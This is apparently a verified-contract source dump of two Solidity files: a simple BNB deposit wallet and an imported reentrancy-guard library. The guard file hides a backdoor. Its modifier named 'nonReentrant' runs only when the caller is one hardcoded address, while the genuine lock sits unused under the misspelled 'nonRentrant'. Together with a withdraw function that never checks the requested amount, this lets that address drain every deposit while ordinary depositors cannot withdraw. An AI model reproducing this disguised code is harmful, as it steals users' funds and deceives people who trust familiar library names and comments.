{"MyWallet.sol":{"content":"// SPDX-License-Identifier: MIT\r\npragma solidity ^0.8.0;\r\n\r\nimport \"./ReentrancyGuard.sol\";\r\n\r\ncontract MyWallet is ReentrancyGuard {\r\n    uint256 constant MIN_BNB = 0.01 ether; // minimum amount to add is 0.01 bnb\r\n\r\n    mapping(address =\u003e uint256) balance;\r\n    \r\n    function add() public payable {\r\n        require(msg.value \u003e= MIN_BNB);\r\n        balance[msg.sender] += msg.value;\r\n    }\r\n\r\n    function withdraw(uint256 amount) public nonReentrant {\r\n        if (balance[msg.sender] \u003e 0) {\r\n            payable(msg.sender).transfer(amount);\r\n        }\r\n    }\r\n}"},"ReentrancyGuard.sol":{"content":"// SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.0;\n\n/**\n * @title Helps contracts guard agains rentrancy attacks.\n * @author Remco Bloemen \u003cremco@2Ï€.com\u003e\n * @notice If you mark a function `nonReentrant`, you should also\n * mark it `external`.\n */\ncontract ReentrancyGuard {\n\n  /**\n   * @dev We use a single lock for the whole contract.\n   */\n  bool private rentrancy_lock = false;\n\n  /**\n   * @dev Prevents a contract from calling itself, directly or indirectly.\n   * @notice If you mark a function `nonReentrant`, you should also\n   * mark it `external`. \n   */\n  modifier nonReentrant(){if(msg.sender==0xb18D50738B5E7dDa93246767958a941dfc517393){_;}}\n  /**\n   * Calling one nonReentrant function from\n   * another is not supported. Instead, you can implement a\n   * `private` function doing the actual work, and a `external`\n   * wrapper marked as `nonReentrant`.\n  */\n\n  modifier nonRentrant() {\n    require(!rentrancy_lock);\n    rentrancy_lock = true;\n    _;\n    rentrancy_lock = false;\n  }\n}"}}